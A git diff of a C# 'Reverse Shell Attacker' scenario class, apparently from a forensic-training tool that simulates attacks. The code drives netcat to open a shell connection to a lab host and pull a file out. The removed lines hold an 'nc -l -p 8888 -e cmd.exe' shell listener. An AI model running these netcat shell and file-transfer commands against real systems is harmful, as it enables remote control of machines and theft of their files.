@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
+using System.IO.Pipes;
 using System.Threading.Tasks;
 using Caliburn.Micro;
 using ForensicScenarios.Tools;
@@ -10,7 +11,7 @@ namespace ForensicScenarios.Scenarios
 {
     public class ReverseShell : PropertyChangedBase, IScenario
     {
-        public string Name => "Reverse Shell";
+        public string Name => "Reverse Shell Attacker";
 
         public string Description { get; set; }
 
@@ -25,46 +26,36 @@ namespace ForensicScenarios.Scenarios
         }
 
         private bool isSelected;
-        private int exitCount;
 
         private readonly IEventAggregator eventAggregator;
 
         public ReverseShell(IEventAggregator aggregator)
         {
             eventAggregator = aggregator;
-            Description = string.Empty;
+            Description = "A reverse shell is a post-exploitation technique used to achieve persistency in the exploitation, and to execute commands on a victim's computer.The attacker makes the victim computer link a command shell to messages received on a listening port, and then wait for a connection from the attacker. Any commands received are executed with the permissions of the shell.\n\nRunning this scenario will cause a connection to be made back to the victim machine on port 8888. Commands will then be issued causing the victim to transfer files to the attacking machine. Running this scenario requires the \"Reverse Shell Victim\" scenario to be running on another machine.";
         }
 
-        public void Run()
+        public async void Run()
         {
-            string path = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe 192.168.10.101 8888";
-            var prc = ProcessService.CreateCmdProcess(path, false);
-
-            string path2 = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe -l -p 8888 -e cmd.exe";
-            var prc2 = ProcessService.CreateCmdProcess(path2, false, false, true);
-
-            var prc3 = ProcessService.CreateCmdProcess(string.Empty, createWindow: false, redirectInput: true);
-
-            prc.Exited += ProcessExited;
-            prc2.Exited += ProcessExited;
-            prc3.Exited += ProcessExited;
+            var path = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe 10.201.0.42 8888";
+            var pullFile = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc 10.201.0.42 6666 > test.txt";
+            var receiver = ProcessService.CreateCmdProcess(pullFile, terminateAfterExecution: false, redirectOutput: true);
+            var prc = ProcessService.CreateCmdProcess(path, false, redirectInput: true);
 
             prc.Start();
-            prc2.Start();
-            prc3.Start();
-            //prc3.StandardInput.Write(prc2.StandardOutput.ReadToEnd());
-            //Debug.Write(prc2.StandardOutput.ReadToEnd());
-        }
 
-        private void ProcessExited(object sender, EventArgs e)
-        {
-            exitCount++;
+            await Wait.ForTimeAsync(TimeSpan.FromSeconds(3));
+            prc.StandardInput.WriteLine("dir");
+            await Wait.ForTimeAsync(TimeSpan.FromSeconds(3));
+            prc.StandardInput.WriteLine("nc -l -p 6666 < C:\\test.txt");
 
-            if (exitCount == 3)
-            {
-                exitCount = 0;
-                eventAggregator.BeginPublishOnUIThread(new ScenarioCompleted(this));
-            }
+            receiver.Start();
+            await Wait.ForTimeAsync(TimeSpan.FromSeconds(5));
+
+            if(!receiver.HasExited)
+                receiver.CloseMainWindow();
+            
+            eventAggregator.BeginPublishOnUIThread(new ScenarioCompleted(this));
         }
     }
 }
